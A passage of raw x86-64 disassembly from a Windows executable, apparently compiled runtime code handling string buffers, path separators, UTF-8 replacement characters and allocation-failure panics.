   1400026fd:	49 8b 56 10          	mov    0x10(%r14),%rdx
   140002701:	48 89 d9             	mov    %rbx,%rcx
   140002704:	e8 47 01 00 00       	call   0x140002850
   140002709:	ba 08 00 00 00       	mov    $0x8,%edx
   14000270e:	48 89 f9             	mov    %rdi,%rcx
   140002711:	e8 3a 01 00 00       	call   0x140002850
   140002716:	e9 11 ff ff ff       	jmp    0x14000262c
   14000271b:	e8 10 ee 02 00       	call   0x140031530
   140002720:	48 89 c6             	mov    %rax,%rsi
   140002723:	e9 2b fe ff ff       	jmp    0x140002553
   140002728:	48 8d 0d c1 09 87 00 	lea    0x8709c1(%rip),%rcx        # 0x1408730f0
   14000272f:	e8 9c c3 00 00       	call   0x14000ead0
   140002734:	89 c1                	mov    %eax,%ecx
   140002736:	e9 86 fd ff ff       	jmp    0x1400024c1
   14000273b:	89 c6                	mov    %eax,%esi
   14000273d:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   140002741:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140002745:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   140002749:	48 8d 05 90 65 86 00 	lea    0x866590(%rip),%rax        # 0x140868ce0
   140002750:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002755:	48 8d 0d d4 08 87 00 	lea    0x8708d4(%rip),%rcx        # 0x140873030
   14000275c:	4c 8d 0d 15 71 86 00 	lea    0x867115(%rip),%r9        # 0x140869878
   140002763:	4c 8d 45 a8          	lea    -0x58(%rbp),%r8
   140002767:	31 d2                	xor    %edx,%edx
   140002769:	e8 32 ee 02 00       	call   0x1400315a0
   14000276e:	89 f0                	mov    %esi,%eax
   140002770:	e9 1c ff ff ff       	jmp    0x140002691
   140002775:	48 8d 0d 74 09 87 00 	lea    0x870974(%rip),%rcx        # 0x1408730f0
   14000277c:	e8 4f c3 00 00       	call   0x14000ead0
   140002781:	89 c1                	mov    %eax,%ecx
   140002783:	e9 ba fd ff ff       	jmp    0x140002542
   140002788:	e8 33 2c 00 00       	call   0x1400053c0
   14000278d:	48 8d 0d f8 08 87 00 	lea    0x8708f8(%rip),%rcx        # 0x14087308c
   140002794:	e8 67 c8 00 00       	call   0x14000f000
   140002799:	e9 ed fd ff ff       	jmp    0x14000258b
   14000279e:	48 83 c1 0c          	add    $0xc,%rcx
   1400027a2:	e8 75 ed 03 00       	call   0x14004151c
   1400027a7:	e9 9f fe ff ff       	jmp    0x14000264b
   1400027ac:	48 89 c6             	mov    %rax,%rsi
   1400027af:	49 83 7e 08 00       	cmpq   $0x0,0x8(%r14)
   1400027b4:	74 0c                	je     0x1400027c2
   1400027b6:	49 8b 56 10          	mov    0x10(%r14),%rdx
   1400027ba:	48 89 d9             	mov    %rbx,%rcx
   1400027bd:	e8 8e 00 00 00       	call   0x140002850
   1400027c2:	ba 08 00 00 00       	mov    $0x8,%edx
   1400027c7:	48 89 f9             	mov    %rdi,%rcx
   1400027ca:	e8 81 00 00 00       	call   0x140002850
   1400027cf:	eb 42                	jmp    0x140002813
   1400027d1:	48 89 c6             	mov    %rax,%rsi
   1400027d4:	49 83 7e 08 00       	cmpq   $0x0,0x8(%r14)
   1400027d9:	74 0c                	je     0x1400027e7
   1400027db:	49 8b 56 10          	mov    0x10(%r14),%rdx
   1400027df:	48 89 d9             	mov    %rbx,%rcx
   1400027e2:	e8 69 00 00 00       	call   0x140002850
   1400027e7:	ba 08 00 00 00       	mov    $0x8,%edx
   1400027ec:	48 89 f9             	mov    %rdi,%rcx
   1400027ef:	e8 5c 00 00 00       	call   0x140002850
   1400027f4:	48 89 f1             	mov    %rsi,%rcx
   1400027f7:	e8 54 f3 03 00       	call   0x140041b50
   1400027fc:	e8 65 c7 00 00       	call   0x14000ef66
   140002801:	48 89 c6             	mov    %rax,%rsi
   140002804:	48 83 7d 30 00       	cmpq   $0x0,0x30(%rbp)
   140002809:	74 08                	je     0x140002813
   14000280b:	48 89 f9             	mov    %rdi,%rcx
   14000280e:	e8 4d c9 00 00       	call   0x14000f160
   140002813:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140002817:	ff 49 08             	decl   0x8(%rcx)
   14000281a:	75 10                	jne    0x14000282c
   14000281c:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   140002823:	31 c0                	xor    %eax,%eax
   140002825:	86 41 0c             	xchg   %al,0xc(%rcx)
   140002828:	3c 02                	cmp    $0x2,%al
   14000282a:	74 08                	je     0x140002834
   14000282c:	48 89 f1             	mov    %rsi,%rcx
   14000282f:	e8 1c f3 03 00       	call   0x140041b50
   140002834:	48 83 c1 0c          	add    $0xc,%rcx
   140002838:	e8 df ec 03 00       	call   0x14004151c
   14000283d:	48 89 f1             	mov    %rsi,%rcx
   140002840:	e8 0b f3 03 00       	call   0x140041b50
   140002845:	e8 a5 36 00 00       	call   0x140005eef
   14000284a:	cc                   	int3
   14000284b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002850:	56                   	push   %rsi
   140002851:	48 83 ec 20          	sub    $0x20,%rsp
   140002855:	48 89 ce             	mov    %rcx,%rsi
   140002858:	48 83 fa 11          	cmp    $0x11,%rdx
   14000285c:	72 04                	jb     0x140002862
   14000285e:	48 8b 76 f8          	mov    -0x8(%rsi),%rsi
   140002862:	e8 b5 ed 03 00       	call   0x14004161c
   140002867:	48 89 c1             	mov    %rax,%rcx
   14000286a:	31 d2                	xor    %edx,%edx
   14000286c:	49 89 f0             	mov    %rsi,%r8
   14000286f:	48 83 c4 20          	add    $0x20,%rsp
   140002873:	5e                   	pop    %rsi
   140002874:	e9 7b ed 03 00       	jmp    0x1400415f4
   140002879:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002880:	56                   	push   %rsi
   140002881:	57                   	push   %rdi
   140002882:	48 83 ec 28          	sub    $0x28,%rsp
   140002886:	4c 89 c6             	mov    %r8,%rsi
   140002889:	48 89 cf             	mov    %rcx,%rdi
   14000288c:	e8 8b ed 03 00       	call   0x14004161c
   140002891:	48 89 c1             	mov    %rax,%rcx
   140002894:	31 d2                	xor    %edx,%edx
   140002896:	49 89 f8             	mov    %rdi,%r8
   140002899:	49 89 f1             	mov    %rsi,%r9
   14000289c:	48 83 c4 28          	add    $0x28,%rsp
   1400028a0:	5f                   	pop    %rdi
   1400028a1:	5e                   	pop    %rsi
   1400028a2:	e9 45 ed 03 00       	jmp    0x1400415ec
   1400028a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400028ae:	00 00 
   1400028b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400028b4:	e8 47 ec 03 00       	call   0x140041500
   1400028b9:	cc                   	int3
   1400028ba:	55                   	push   %rbp
   1400028bb:	48 83 ec 30          	sub    $0x30,%rsp
   1400028bf:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400028c4:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   1400028cb:	00 00 
   1400028cd:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400028d3:	e8 4e 4d 00 00       	call   0x140007626
   1400028d8:	48 b9 01 00 00 00 00 	movabs $0x8000000000000001,%rcx
   1400028df:	00 00 80 
   1400028e2:	48 39 c8             	cmp    %rcx,%rax
   1400028e5:	75 06                	jne    0x1400028ed
   1400028e7:	48 83 c4 30          	add    $0x30,%rsp
   1400028eb:	5d                   	pop    %rbp
   1400028ec:	c3                   	ret
   1400028ed:	4c 8d 05 54 5d 86 00 	lea    0x865d54(%rip),%r8        # 0x140868648
   1400028f4:	48 89 c1             	mov    %rax,%rcx
   1400028f7:	e8 12 02 00 00       	call   0x140002b0e
   1400028fc:	cc                   	int3
   1400028fd:	55                   	push   %rbp
   1400028fe:	41 57                	push   %r15
   140002900:	41 56                	push   %r14
   140002902:	41 54                	push   %r12
   140002904:	56                   	push   %rsi
   140002905:	57                   	push   %rdi
   140002906:	53                   	push   %rbx
   140002907:	48 83 ec 20          	sub    $0x20,%rsp
   14000290b:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002910:	4c 89 c6             	mov    %r8,%rsi
   140002913:	48 89 d3             	mov    %rdx,%rbx
   140002916:	48 89 cf             	mov    %rcx,%rdi
   140002919:	4d 85 c0             	test   %r8,%r8
   14000291c:	74 29                	je     0x140002947
   14000291e:	80 3b 2f             	cmpb   $0x2f,(%rbx)
   140002921:	74 33                	je     0x140002956
   140002923:	48 83 fe 01          	cmp    $0x1,%rsi
   140002927:	74 1e                	je     0x140002947
   140002929:	80 7b 01 c0          	cmpb   $0xc0,0x1(%rbx)
   14000292d:	7c 18                	jl     0x140002947
   14000292f:	48 83 fe 03          	cmp    $0x3,%rsi
   140002933:	77 04                	ja     0x140002939
   140002935:	74 08                	je     0x14000293f
   140002937:	eb 0e                	jmp    0x140002947
   140002939:	80 7b 03 c0          	cmpb   $0xc0,0x3(%rbx)
   14000293d:	7c 08                	jl     0x140002947
   14000293f:	66 81 7b 01 3a 2f    	cmpw   $0x2f3a,0x1(%rbx)
   140002945:	74 0f                	je     0x140002956
   140002947:	48 89 d9             	mov    %rbx,%rcx
   14000294a:	48 89 f2             	mov    %rsi,%rdx
   14000294d:	e8 22 01 00 00       	call   0x140002a74
   140002952:	84 c0                	test   %al,%al
   140002954:	74 28                	je     0x14000297e
   140002956:	48 85 f6             	test   %rsi,%rsi
   140002959:	0f 88 03 01 00 00    	js     0x140002a62
   14000295f:	74 66                	je     0x1400029c7
   140002961:	48 89 f1             	mov    %rsi,%rcx
   140002964:	e8 37 e4 03 00       	call   0x140040da0
   140002969:	49 89 c6             	mov    %rax,%r14
   14000296c:	49 89 f7             	mov    %rsi,%r15
   14000296f:	48 85 c0             	test   %rax,%rax
   140002972:	75 5c                	jne    0x1400029d0
   140002974:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002979:	e9 e6 00 00 00       	jmp    0x140002a64
   14000297e:	4c 8b 7f 08          	mov    0x8(%rdi),%r15
   140002982:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   140002986:	4c 89 f9             	mov    %r15,%rcx
   140002989:	4c 89 f2             	mov    %r14,%rdx
   14000298c:	e8 e3 00 00 00       	call   0x140002a74
   140002991:	4d 85 f6             	test   %r14,%r14
   140002994:	74 61                	je     0x1400029f7
   140002996:	84 c0                	test   %al,%al
   140002998:	b8 5c 00 00 00       	mov    $0x5c,%eax
   14000299d:	41 bc 2f 00 00 00    	mov    $0x2f,%r12d
   1400029a3:	44 0f 45 e0          	cmovne %eax,%r12d
   1400029a7:	47 3a 64 37 ff       	cmp    -0x1(%r15,%r14,1),%r12b
   1400029ac:	74 4c                	je     0x1400029fa
   1400029ae:	4c 89 f0             	mov    %r14,%rax
   1400029b1:	4c 39 37             	cmp    %r14,(%rdi)
   1400029b4:	0f 84 8a 00 00 00    	je     0x140002a44
   1400029ba:	45 88 24 07          	mov    %r12b,(%r15,%rax,1)
   1400029be:	49 ff c6             	inc    %r14
   1400029c1:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   1400029c5:	eb 33                	jmp    0x1400029fa
   1400029c7:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1400029cd:	45 31 ff             	xor    %r15d,%r15d
   1400029d0:	4c 89 f1             	mov    %r14,%rcx
   1400029d3:	48 89 da             	mov    %rbx,%rdx
   1400029d6:	49 89 f0             	mov    %rsi,%r8
   1400029d9:	e8 82 f5 03 00       	call   0x140041f60
   1400029de:	48 8b 0f             	mov    (%rdi),%rcx
   1400029e1:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   1400029e5:	e8 67 4d 00 00       	call   0x140007751
   1400029ea:	4c 89 3f             	mov    %r15,(%rdi)
   1400029ed:	4c 89 77 08          	mov    %r14,0x8(%rdi)
   1400029f1:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   1400029f5:	eb 26                	jmp    0x140002a1d
   1400029f7:	45 31 f6             	xor    %r14d,%r14d
   1400029fa:	48 8b 07             	mov    (%rdi),%rax
   1400029fd:	4c 29 f0             	sub    %r14,%rax
   140002a00:	48 39 c6             	cmp    %rax,%rsi
   140002a03:	77 27                	ja     0x140002a2c
   140002a05:	4d 01 f7             	add    %r14,%r15
   140002a08:	4c 89 f9             	mov    %r15,%rcx
   140002a0b:	48 89 da             	mov    %rbx,%rdx
   140002a0e:	49 89 f0             	mov    %rsi,%r8
   140002a11:	e8 4a f5 03 00       	call   0x140041f60
   140002a16:	49 01 f6             	add    %rsi,%r14
   140002a19:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   140002a1d:	48 83 c4 20          	add    $0x20,%rsp
   140002a21:	5b                   	pop    %rbx
   140002a22:	5f                   	pop    %rdi
   140002a23:	5e                   	pop    %rsi
   140002a24:	41 5c                	pop    %r12
   140002a26:	41 5e                	pop    %r14
   140002a28:	41 5f                	pop    %r15
   140002a2a:	5d                   	pop    %rbp
   140002a2b:	c3                   	ret
   140002a2c:	48 89 f9             	mov    %rdi,%rcx
   140002a2f:	4c 89 f2             	mov    %r14,%rdx
   140002a32:	49 89 f0             	mov    %rsi,%r8
   140002a35:	e8 80 fe ff ff       	call   0x1400028ba
   140002a3a:	4c 8b 7f 08          	mov    0x8(%rdi),%r15
   140002a3e:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   140002a42:	eb c1                	jmp    0x140002a05
   140002a44:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002a4a:	48 89 f9             	mov    %rdi,%rcx
   140002a4d:	4c 89 f2             	mov    %r14,%rdx
   140002a50:	e8 65 fe ff ff       	call   0x1400028ba
   140002a55:	4c 8b 7f 08          	mov    0x8(%rdi),%r15
   140002a59:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140002a5d:	e9 58 ff ff ff       	jmp    0x1400029ba
   140002a62:	31 c9                	xor    %ecx,%ecx
   140002a64:	4c 8d 05 cd 5f 86 00 	lea    0x865fcd(%rip),%r8        # 0x140868a38
   140002a6b:	48 89 f2             	mov    %rsi,%rdx
   140002a6e:	e8 9b 00 00 00       	call   0x140002b0e
   140002a73:	cc                   	int3
   140002a74:	48 85 d2             	test   %rdx,%rdx
   140002a77:	74 1b                	je     0x140002a94
   140002a79:	b0 01                	mov    $0x1,%al
   140002a7b:	80 39 5c             	cmpb   $0x5c,(%rcx)
   140002a7e:	74 16                	je     0x140002a96
   140002a80:	48 83 fa 01          	cmp    $0x1,%rdx
   140002a84:	74 0e                	je     0x140002a94
   140002a86:	80 79 01 c0          	cmpb   $0xc0,0x1(%rcx)
   140002a8a:	7c 08                	jl     0x140002a94
   140002a8c:	48 83 fa 03          	cmp    $0x3,%rdx
   140002a90:	77 05                	ja     0x140002a97
   140002a92:	74 09                	je     0x140002a9d
   140002a94:	31 c0                	xor    %eax,%eax
   140002a96:	c3                   	ret
   140002a97:	80 79 03 c0          	cmpb   $0xc0,0x3(%rcx)
   140002a9b:	7c f7                	jl     0x140002a94
   140002a9d:	66 81 79 01 3a 5c    	cmpw   $0x5c3a,0x1(%rcx)
   140002aa3:	0f 94 c0             	sete   %al
   140002aa6:	c3                   	ret
   140002aa7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002aae:	00 00 
   140002ab0:	55                   	push   %rbp
   140002ab1:	56                   	push   %rsi
   140002ab2:	57                   	push   %rdi
   140002ab3:	48 83 ec 20          	sub    $0x20,%rsp
   140002ab7:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002abc:	48 89 d7             	mov    %rdx,%rdi
   140002abf:	48 89 ce             	mov    %rcx,%rsi
   140002ac2:	49 83 78 08 00       	cmpq   $0x0,0x8(%r8)
   140002ac7:	74 19                	je     0x140002ae2
   140002ac9:	49 83 78 10 00       	cmpq   $0x0,0x10(%r8)
   140002ace:	74 12                	je     0x140002ae2
   140002ad0:	49 8b 08             	mov    (%r8),%rcx
   140002ad3:	ba 01 00 00 00       	mov    $0x1,%edx
   140002ad8:	49 89 f8             	mov    %rdi,%r8
   140002adb:	e8 a0 fd ff ff       	call   0x140002880
   140002ae0:	eb 08                	jmp    0x140002aea
   140002ae2:	48 89 f9             	mov    %rdi,%rcx
   140002ae5:	e8 b6 e2 03 00       	call   0x140040da0
   140002aea:	31 c9                	xor    %ecx,%ecx
   140002aec:	48 85 c0             	test   %rax,%rax
   140002aef:	ba 01 00 00 00       	mov    $0x1,%edx
   140002af4:	48 0f 45 d0          	cmovne %rax,%rdx
   140002af8:	0f 94 c1             	sete   %cl
   140002afb:	48 89 56 08          	mov    %rdx,0x8(%rsi)
   140002aff:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   140002b03:	48 89 0e             	mov    %rcx,(%rsi)
   140002b06:	48 83 c4 20          	add    $0x20,%rsp
   140002b0a:	5f                   	pop    %rdi
   140002b0b:	5e                   	pop    %rsi
   140002b0c:	5d                   	pop    %rbp
   140002b0d:	c3                   	ret
   140002b0e:	55                   	push   %rbp
   140002b0f:	48 83 ec 20          	sub    $0x20,%rsp
   140002b13:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002b18:	48 85 c9             	test   %rcx,%rcx
   140002b1b:	75 08                	jne    0x140002b25
   140002b1d:	4c 89 c1             	mov    %r8,%rcx
   140002b20:	e8 2b 00 00 00       	call   0x140002b50
   140002b25:	e8 01 00 00 00       	call   0x140002b2b
   140002b2a:	cc                   	int3
   140002b2b:	55                   	push   %rbp
   140002b2c:	48 83 ec 20          	sub    $0x20,%rsp
   140002b30:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002b35:	48 89 c8             	mov    %rcx,%rax
   140002b38:	48 89 d1             	mov    %rdx,%rcx
   140002b3b:	48 89 c2             	mov    %rax,%rdx
   140002b3e:	e8 6d fd ff ff       	call   0x1400028b0
   140002b43:	cc                   	int3
   140002b44:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140002b4b:	00 00 00 00 00 
   140002b50:	55                   	push   %rbp
   140002b51:	48 83 ec 50          	sub    $0x50,%rsp
   140002b55:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140002b5a:	48 89 ca             	mov    %rcx,%rdx
   140002b5d:	48 8d 05 cc 4f 86 00 	lea    0x864fcc(%rip),%rax        # 0x140867b30
   140002b64:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140002b68:	48 c7 45 d8 01 00 00 	movq   $0x1,-0x28(%rbp)
   140002b6f:	00 
   140002b70:	48 c7 45 e0 08 00 00 	movq   $0x8,-0x20(%rbp)
   140002b77:	00 
   140002b78:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002b7b:	0f 11 45 e8          	movups %xmm0,-0x18(%rbp)
   140002b7f:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140002b83:	e8 c8 07 00 00       	call   0x140003350
   140002b88:	cc                   	int3
   140002b89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002b90:	55                   	push   %rbp
   140002b91:	56                   	push   %rsi
   140002b92:	57                   	push   %rdi
   140002b93:	48 83 ec 50          	sub    $0x50,%rsp
   140002b97:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140002b9c:	4c 01 c2             	add    %r8,%rdx
   140002b9f:	72 6a                	jb     0x140002c0b
   140002ba1:	48 89 ce             	mov    %rcx,%rsi
   140002ba4:	48 8b 01             	mov    (%rcx),%rax
   140002ba7:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140002bab:	48 39 ca             	cmp    %rcx,%rdx
   140002bae:	48 0f 47 ca          	cmova  %rdx,%rcx
   140002bb2:	48 83 f9 09          	cmp    $0x9,%rcx
   140002bb6:	bf 08 00 00 00       	mov    $0x8,%edi
   140002bbb:	48 0f 43 f9          	cmovae %rcx,%rdi
   140002bbf:	48 85 ff             	test   %rdi,%rdi
   140002bc2:	78 47                	js     0x140002c0b
   140002bc4:	48 85 c0             	test   %rax,%rax
   140002bc7:	75 04                	jne    0x140002bcd
   140002bc9:	31 c0                	xor    %eax,%eax
   140002bcb:	eb 11                	jmp    0x140002bde
   140002bcd:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   140002bd1:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140002bd5:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140002bd9:	b8 01 00 00 00       	mov    $0x1,%eax
   140002bde:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140002be2:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140002be6:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   140002bea:	48 89 fa             	mov    %rdi,%rdx
   140002bed:	e8 be fe ff ff       	call   0x140002ab0
   140002bf2:	83 7d e8 01          	cmpl   $0x1,-0x18(%rbp)
   140002bf6:	74 21                	je     0x140002c19
   140002bf8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002bfc:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140002c00:	48 89 3e             	mov    %rdi,(%rsi)
   140002c03:	48 83 c4 50          	add    $0x50,%rsp
   140002c07:	5f                   	pop    %rdi
   140002c08:	5e                   	pop    %rsi
   140002c09:	5d                   	pop    %rbp
   140002c0a:	c3                   	ret
   140002c0b:	31 c9                	xor    %ecx,%ecx
   140002c0d:	4c 8d 05 24 33 86 00 	lea    0x863324(%rip),%r8        # 0x140865f38
   140002c14:	e8 f5 fe ff ff       	call   0x140002b0e
   140002c19:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002c1d:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140002c21:	4c 8d 05 10 33 86 00 	lea    0x863310(%rip),%r8        # 0x140865f38
   140002c28:	e8 e1 fe ff ff       	call   0x140002b0e
   140002c2d:	cc                   	int3
   140002c2e:	66 90                	xchg   %ax,%ax
   140002c30:	55                   	push   %rbp
   140002c31:	41 57                	push   %r15
   140002c33:	41 56                	push   %r14
   140002c35:	41 55                	push   %r13
   140002c37:	41 54                	push   %r12
   140002c39:	56                   	push   %rsi
   140002c3a:	57                   	push   %rdi
   140002c3b:	53                   	push   %rbx
   140002c3c:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140002c43:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140002c4a:	00 
   140002c4b:	4d 89 c6             	mov    %r8,%r14
   140002c4e:	48 89 ce             	mov    %rcx,%rsi
   140002c51:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140002c55:	4c 89 45 e0          	mov    %r8,-0x20(%rbp)
   140002c59:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140002c5d:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140002c61:	e8 4a 15 00 00       	call   0x1400041b0
   140002c66:	4c 8b 65 b8          	mov    -0x48(%rbp),%r12
   140002c6a:	4d 85 e4             	test   %r12,%r12
   140002c6d:	74 2c                	je     0x140002c9b
   140002c6f:	4c 8b 7d c0          	mov    -0x40(%rbp),%r15
   140002c73:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
   140002c78:	74 33                	je     0x140002cad
   140002c7a:	4d 85 f6             	test   %r14,%r14
   140002c7d:	0f 88 c0 01 00 00    	js     0x140002e43
   140002c83:	74 42                	je     0x140002cc7
   140002c85:	4c 89 f1             	mov    %r14,%rcx
   140002c88:	e8 13 e1 03 00       	call   0x140040da0
   140002c8d:	48 85 c0             	test   %rax,%rax
   140002c90:	0f 84 b9 01 00 00    	je     0x140002e4f
   140002c96:	48 89 c7             	mov    %rax,%rdi
   140002c99:	eb 31                	jmp    0x140002ccc
   140002c9b:	48 c7 46 08 01 00 00 	movq   $0x1,0x8(%rsi)
   140002ca2:	00 
   140002ca3:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
   140002caa:	00 
   140002cab:	eb 08                	jmp    0x140002cb5
   140002cad:	4c 89 66 08          	mov    %r12,0x8(%rsi)
   140002cb1:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   140002cb5:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   140002cbc:	00 00 80 
   140002cbf:	48 89 06             	mov    %rax,(%rsi)
   140002cc2:	e9 2a 01 00 00       	jmp    0x140002df1
   140002cc7:	bf 01 00 00 00       	mov    $0x1,%edi
   140002ccc:	4c 89 75 f0          	mov    %r14,-0x10(%rbp)
   140002cd0:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
   140002cd4:	48 c7 45 00 00 00 00 	movq   $0x0,0x0(%rbp)
   140002cdb:	00 
   140002cdc:	4d 39 f7             	cmp    %r14,%r15
   140002cdf:	0f 87 20 01 00 00    	ja     0x140002e05
   140002ce5:	31 db                	xor    %ebx,%ebx
   140002ce7:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   140002ceb:	4c 89 e2             	mov    %r12,%rdx
   140002cee:	4d 89 f8             	mov    %r15,%r8
   140002cf1:	e8 6a f2 03 00       	call   0x140041f60
   140002cf6:	4c 01 fb             	add    %r15,%rbx
   140002cf9:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   140002cfd:	49 29 de             	sub    %rbx,%r14
   140002d00:	49 83 fe 02          	cmp    $0x2,%r14
   140002d04:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
   140002d08:	0f 86 16 01 00 00    	jbe    0x140002e24
   140002d0e:	c6 44 1f 02 bd       	movb   $0xbd,0x2(%rdi,%rbx,1)
   140002d13:	66 c7 04 1f ef bf    	movw   $0xbfef,(%rdi,%rbx,1)
   140002d19:	48 83 c3 03          	add    $0x3,%rbx
   140002d1d:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   140002d21:	0f 10 45 d8          	movups -0x28(%rbp),%xmm0
   140002d25:	0f 11 45 a8          	movups %xmm0,-0x58(%rbp)
   140002d29:	4c 8d 75 b8          	lea    -0x48(%rbp),%r14
   140002d2d:	4c 8d 7d a8          	lea    -0x58(%rbp),%r15
   140002d31:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140002d38:	0f 1f 84 00 00 00 00 
   140002d3f:	00 
   140002d40:	4c 89 f1             	mov    %r14,%rcx
   140002d43:	4c 89 fa             	mov    %r15,%rdx
   140002d46:	e8 65 14 00 00       	call   0x1400041b0
   140002d4b:	4c 8b 6d b8          	mov    -0x48(%rbp),%r13
   140002d4f:	4d 85 ed             	test   %r13,%r13
   140002d52:	0f 84 86 00 00 00    	je     0x140002dde
   140002d58:	4c 8b 65 c0          	mov    -0x40(%rbp),%r12
   140002d5c:	48 8b 75 d0          	mov    -0x30(%rbp),%rsi
   140002d60:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002d64:	48 29 d8             	sub    %rbx,%rax
   140002d67:	49 39 c4             	cmp    %rax,%r12
   140002d6a:	77 3d                	ja     0x140002da9
   140002d6c:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   140002d70:	4c 89 ea             	mov    %r13,%rdx
   140002d73:	4d 89 e0             	mov    %r12,%r8
   140002d76:	e8 e5 f1 03 00       	call   0x140041f60
   140002d7b:	4c 01 e3             	add    %r12,%rbx
   140002d7e:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   140002d82:	48 85 f6             	test   %rsi,%rsi
   140002d85:	74 b9                	je     0x140002d40
   140002d87:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002d8b:	48 29 d8             	sub    %rbx,%rax
   140002d8e:	48 83 f8 02          	cmp    $0x2,%rax
   140002d92:	76 2e                	jbe    0x140002dc2
   140002d94:	c6 44 1f 02 bd       	movb   $0xbd,0x2(%rdi,%rbx,1)
   140002d99:	66 c7 04 1f ef bf    	movw   $0xbfef,(%rdi,%rbx,1)
   140002d9f:	48 83 c3 03          	add    $0x3,%rbx
   140002da3:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   140002da7:	eb 97                	jmp    0x140002d40
   140002da9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002dad:	48 89 da             	mov    %rbx,%rdx
   140002db0:	4d 89 e0             	mov    %r12,%r8
   140002db3:	e8 d8 fd ff ff       	call   0x140002b90
   140002db8:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
   140002dbc:	48 8b 5d 00          	mov    0x0(%rbp),%rbx
   140002dc0:	eb aa                	jmp    0x140002d6c
   140002dc2:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140002dc8:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002dcc:	48 89 da             	mov    %rbx,%rdx
   140002dcf:	e8 bc fd ff ff       	call   0x140002b90
   140002dd4:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
   140002dd8:	48 8b 5d 00          	mov    0x0(%rbp),%rbx
   140002ddc:	eb b6                	jmp    0x140002d94
   140002dde:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140002de2:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002de6:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002dea:	0f 10 45 f0          	movups -0x10(%rbp),%xmm0
   140002dee:	0f 11 01             	movups %xmm0,(%rcx)
   140002df1:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140002df8:	5b                   	pop    %rbx
   140002df9:	5f                   	pop    %rdi
   140002dfa:	5e                   	pop    %rsi
   140002dfb:	41 5c                	pop    %r12
   140002dfd:	41 5d                	pop    %r13
   140002dff:	41 5e                	pop    %r14
   140002e01:	41 5f                	pop    %r15
   140002e03:	5d                   	pop    %rbp
   140002e04:	c3                   	ret
   140002e05:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e09:	31 d2                	xor    %edx,%edx
   140002e0b:	4d 89 f8             	mov    %r15,%r8
